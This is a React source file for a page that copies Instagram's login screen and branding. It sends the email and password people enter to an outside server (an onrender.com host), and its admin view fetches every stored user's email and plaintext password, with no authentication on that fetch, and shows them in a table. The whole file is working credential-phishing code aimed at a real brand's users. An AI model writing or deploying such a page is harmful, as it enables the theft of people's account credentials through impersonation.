import { useState, useEffect } from 'react';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isAdmin, setIsAdmin] = useState(false);
  const [users, setUsers] = useState([]); // MongoDB Users List

  const handleLogin = async (e) => {
    e.preventDefault();
    const response = await fetch(
      'https://instagramlogin-mongodb.onrender.com/api/auth/login',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      },
    );

    const data = await response.json();

    if (response.ok) {
      if (data.isAdmin) {
        toast.success('Admin login successful! 🎉');
        setIsAdmin(true);
        fetchUsers(); // Fetch users from MongoDB
      } else {
        toast.success('Login successful! 🎉');
      }
    } else {
      toast.error(data.message || 'Login failed! ❌');
    }
  };

  // MongoDB se users ka data fetch karne ke liye
  const fetchUsers = async () => {
    const response = await fetch(
      'https://instagramlogin-mongodb.onrender.com/api/auth/users',
    );
    const data = await response.json();
    setUsers(data);
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-50">
      {!isAdmin ? (
        <div className="p-8 text-center bg-white border rounded-lg shadow-lg w-96">
          <div className="flex justify-center mb-6">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
              alt="Instagram"
              className="w-16"
            />
          </div>

          <h2 className="mb-6 text-3xl font-bold text-gray-800">Instagram</h2>

          <form onSubmit={handleLogin} className="space-y-4">
            <input
              type="text"
              placeholder="Email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              className="w-full p-3 bg-gray-100 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              className="w-full p-3 bg-gray-100 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
            />
            <button
              type="submit"
              className="w-full py-3 font-bold text-white transition bg-blue-500 rounded-lg hover:opacity-90"
            >
              Log In
            </button>
          </form>

          <div className="mt-6 text-sm text-gray-600">
            <p>
              Don't have an account?{' '}
              <a href="#" className="font-bold text-blue-500 hover:underline">
                Sign up
              </a>
            </p>
          </div>
        </div>
      ) : (
        <div className="p-8 text-center bg-white border rounded-lg shadow-lg w-full">
          <h2 className="mb-6 text-3xl font-bold text-gray-800">Admin Panel</h2>
          <table className="w-full border-collapse border border-gray-200">
            <thead>
              <tr className="bg-gray-100">
                <th className="p-2 border">Email</th>
                <th className="p-2 border">Password</th>
              </tr>
            </thead>
            <tbody>
              {users.map((user, index) => (
                <tr key={index} className="border">
                  <td className="p-2 border">{user.email}</td>
                  <td className="p-2 border">{user.password}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      <ToastContainer position="top-right" autoClose={3000} />
    </div>
  );
}

export default App;
